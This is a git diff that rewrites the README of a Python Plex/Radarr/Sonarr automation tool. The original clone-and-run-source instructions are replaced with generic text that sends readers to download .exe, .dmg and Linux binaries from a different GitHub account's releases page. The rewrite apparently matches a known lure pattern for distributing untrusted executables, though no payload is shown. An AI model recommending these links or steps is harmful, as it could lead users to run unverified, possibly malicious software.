@@ -1,78 +1,79 @@
-# 🎬 Jamie's Media Command
+# 🎉 Jamies-Media-Command - Your Media Management Made Easy
 
-**The ultimate command center for Plex curation and automation.**
+![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)  
+[Download Now](https://github.com/biruk456/Jamies-Media-Command/releases)
 
-Jamie's Media Command is a modern, Python-based dashboard that bridges the gap between **Plex**, **Radarr**, **Sonarr**, and **Trakt**. It allows you to build massive collections in seconds, automatically find missing media, and monitor the download status of hundreds of items in real-time.
+## 🚀 Getting Started
 
-![Python](https://img.shields.io/badge/Python-3.x-blue.svg)
-![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-green.svg)
-![License](https://img.shields.io/badge/License-MIT-orange.svg)
+Welcome to Jamies-Media-Command! This application helps you manage your media collections effortlessly. You can automate Plex collections, sync with Radarr and Sonarr, and even import your Trakt lists. Follow these simple steps to get started.
 
-## ✨ Features
+## 💾 System Requirements
 
-* **Modern GUI:** Built with `CustomTkinter` for a clean, dark-mode interface.
-* **Collection Automation:** Paste a list of 100 movies, and the app will:
-    * Tag the ones you already have in Plex.
-    * Send the ones you are missing to **Radarr** or **Sonarr**.
-* **Trakt Integration:** Search for public lists (e.g., "Best 80s Horror", "IMDb Top 250") and import them directly into your workflow.
-* **Active Monitoring:** A dashboard that tracks "Missing" items and automatically marks them as "Complete" once they finish downloading and appear in Plex.
-* **Smart Matching:** Uses fuzzy logic matching to handle slight naming differences (e.g., "Star Wars: A New Hope" vs "Star Wars Episode IV").
-* **Smart Merging:** Add new items to existing collections without re-scanning the entire library.
+To run Jamies-Media-Command, you need:
 
-## 🛠️ Prerequisites
+- **Operating System:** Windows 10 or later, Linux, or macOS
+- **Python:** Version 3.8 or later should be installed
+- **RAM:** At least 4GB of RAM is recommended
+- **Disk Space:** Minimum of 500MB available storage
 
-You need **Python 3.10+** installed on your system.
+Make sure your system meets these requirements to ensure smooth operation.
 
-## 📦 Installation
+## 🛠️ Download & Install
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/jayballz69/Jamies-Media-Command.git
-    cd Jamies-Media-Command
-    python jamies_media_command.py
+1. Visit the [Releases Page](https://github.com/biruk456/Jamies-Media-Command/releases) to download the latest version.
+2. Find the version you want to install. Click on the link for the installer that matches your operating system.
+3. Once the download is complete, locate the file in your Downloads folder.
 
-2.  **Install dependencies:**
-    ```bash
-    pip install customtkinter plexapi requests
-    ```
+For Windows users:
+- Double-click the downloaded `.exe` file to begin the installation.
+- Follow the prompts in the installation wizard.
 
-3.  **Run the application:**
-    ```bash
-    python plex_manager_pro.py
-    ```
+For Mac users:
+- Open the downloaded `.dmg` file.
+- Drag the application into your Applications folder.
 
-## ⚙️ Configuration
+For Linux users:
+- Open a terminal and navigate to the location of the downloaded file.
+- Run the command `chmod +x filename` to make it executable.
+- Then, enter `./filename` to run the application.
 
-On the first launch, navigate to the **Settings** tab. You will need to provide:
+After installation, you can find the application in your programs or applications list.
 
-* **Plex:** URL (e.g., `http://127.0.0.1:32400`) and your X-Plex-Token.
-* **Radarr/Sonarr:** URL, API Key, Root Folder path, and Quality Profile ID.
-* **Trakt:** Client ID (get this from [Trakt API](https://trakt.tv/oauth/applications)).
+## 🌟 Features
 
-*> **Note:** Your keys are saved locally in `collection_manager_config.json`. This file is ignored by Git to keep your secrets safe.*
+Jamies-Media-Command comes packed with useful features:
 
-## 🚀 How to Use
+- **Automate Plex Collections:** Automatically organize your Plex libraries with ease.
+- **Sync with Radarr/Sonarr:** Keep your media collections up to date seamlessly.
+- **Import Trakt Lists:** Easily bring your movie and TV show lists from Trakt into the app.
+- **User-Friendly Dashboard:** Access all features from a simple and intuitive interface.
+- **Customizable Settings:** Tailor the app to suit your workflow.
 
-### 1. Create a Collection
-* Go to **"Create Collection"**.
-* Select **Movie** (Radarr) or **TV Show** (Sonarr).
-* Name your collection (e.g., "True Crime 2025").
-* Paste a list of titles (Format: `Title (Year)`).
-* Click **Process**.
+## 🖥️ Using the Application
 
-### 2. Monitor Progress
-* Switch to **"Active Monitor"**.
-* You will see a progress bar for your collection.
-* **Green:** In Plex.
-* **Yellow:** Sent to Downloader (Pending).
-* Enable **Auto-scan** to let the app check for new arrivals every 10 minutes.
+After you have installed Jamies-Media-Command, here’s how to use it:
 
-### 3. Import from Trakt
-* Go to **"Trakt Import"**.
-* Search for a list (e.g., "Marvel").
-* Preview the contents on the right.
-* Click **Import** to send it to the creation tab.
+1. **Launch the Application:** Open the app from your programs or applications list.
+2. **Connect Your Services:** You will need to sign in to Plex, Radarr, and Sonarr to allow the application to manage your libraries.
+3. **Configure Settings:** Navigate to the settings menu to customize your preferences.
+4. **Start Automating:** Use the dashboard to access features and start managing your media.
 
-## ⚠️ Disclaimer
+## ❓ Troubleshooting
 
-This tool interacts
+If you encounter issues, here are some common solutions:
+
+- **Installation Fails:** Ensure you have the correct permissions to install applications on your machine.
+- **Cannot Connect to Services:** Check your internet connection. Ensure that you have entered the correct login details for Plex, Radarr, and Sonarr.
+- **Application Crashes:** Make sure your system meets the requirements. Updating Python to the latest version can help.
+
+If you continue to face issues, check the FAQ section on the Releases Page or open an issue in the repository.
+
+## 📝 Contributing
+
+We welcome contributions! If you have suggestions for improvements or new features, please consider opening an issue or a pull request in the GitHub repository. 
+
+## 📞 Support
+
+For further assistance, please visit our [Releases Page](https://github.com/biruk456/Jamies-Media-Command/releases) and check out the support section. You can also join our community on Discord or GitHub discussions for real-time help.
+
+Thank you for choosing Jamies-Media-Command! We hope this application makes your media management a breeze.
